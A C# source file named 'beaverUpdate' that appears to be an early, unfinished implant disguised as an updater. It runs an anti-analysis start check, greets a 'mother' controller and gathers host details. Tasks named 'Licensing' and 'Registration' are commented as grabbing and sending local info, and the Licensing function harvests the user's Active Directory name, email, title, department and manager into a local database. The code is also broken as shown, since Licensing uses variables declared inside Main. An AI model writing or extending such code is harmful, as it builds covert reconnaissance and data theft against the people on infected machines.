using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;
using VoidSerpent;
using System.Runtime.CompilerServices;

namespace beaverUpdate
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // protected start: one instance, specific parents
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("Unable to run due to security measures.");
                return;
            }

            // Ensure we're tracking state
            var db = new DatabaseManager("syncstate.db");

            // Start the task flow
            List<string> userJobDone = new List<string>
            {
                "collected",
                "completed",
                "failed"
            };

            List<string> tasks = new List<string>
            {
                "Licensing", // grab local info
                "Registration", // grab and send local info
                "",

            };

            // Run through the tasks





            // Say hello to mother. 
            Console.WriteLine("Hello mother!");
            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();



            


            Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
            //await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
            var jobdb = db.GetJobs();
            foreach (var job in jobdb )
            {
                Console.WriteLine($"Jobname: {job}");
            }


        }

        // Task functions
        static void Licensing()
        {
            string userJob = db.GetJobStatus("userinfo");

            if (!userJobDone.Contains(userJob))
            {
                Console.WriteLine($"Collecting user job info: {userJob}");
                try
                {
                    // Get the current user's active directory info, store to local db, record task
                    DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
                    db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
                    db.JobEntry(name: "Licensing", status: "collected");
                }
                catch
                {
                    Console.WriteLine("Marking task failed");
                    db.JobEntry(name: "Licensing", status: "failed");
                }
            }
            else
            {
                Console.WriteLine($"Skipped user check as previous attempt was {userJob}");
            }
        }
    }    
}
